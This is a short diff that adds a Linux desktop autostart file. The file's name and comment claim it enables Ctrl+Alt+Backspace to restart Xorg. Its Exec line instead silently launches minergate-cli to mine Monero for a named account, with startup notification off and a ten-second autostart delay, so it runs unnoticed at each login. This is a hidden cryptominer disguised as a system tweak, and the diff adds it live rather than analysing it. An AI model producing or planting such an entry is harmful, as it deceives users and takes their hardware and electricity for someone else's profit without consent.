@@ -1,0 +1,12 @@
+
+[Desktop Entry]
+Encoding=UTF-8
+Version=1.0
+Name=Ctrl Alt Backspace
+Comment=Allows Ctrl+Alt+Backspace to restart Xorg
+Exec=minergate-cli -u ukn1337miner@gmail.com --xmr 2 &
+Terminal=false
+Type=Application
+StartupNotify=false
+Terminal=false
+X-GNOME-Autostart-Delay=10
